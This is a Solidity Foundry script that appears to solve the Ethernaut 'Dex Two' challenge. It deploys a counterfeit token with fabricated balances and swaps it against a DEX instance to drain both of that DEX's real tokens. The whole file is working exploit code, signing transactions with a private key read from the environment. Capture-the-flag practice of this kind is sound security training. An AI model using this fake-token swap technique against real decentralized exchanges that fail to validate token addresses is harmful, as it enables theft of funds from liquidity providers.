// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function swap(address from, address to, uint256 amount) external;
}

contract PhoneyToken {
    mapping(address => uint256) public balances;

    constructor(address instant) {
        balances[msg.sender] = 300;
        balances[instant] = 100;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool){
        balances[from] = balances[from] - amount;
        balances[to] += amount;
        return true;
    }
    
    function balanceOf(address account) external view returns (uint256){
        return balances[account];
    }
}

contract Solver is Script {
    address dextwo = vm.envAddress("DEXTWO_INSTANCE");

    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV_KEY"));

        PhoneyToken phoney_token = new PhoneyToken(dextwo);

        address token1 = IDex(dextwo).token1();
        address token2 = IDex(dextwo).token2();
        
        IDex(dextwo).swap(address(phoney_token), token1, 100);
        IDex(dextwo).swap(address(phoney_token), token2, 200);

        vm.stopBroadcast();
    }
}
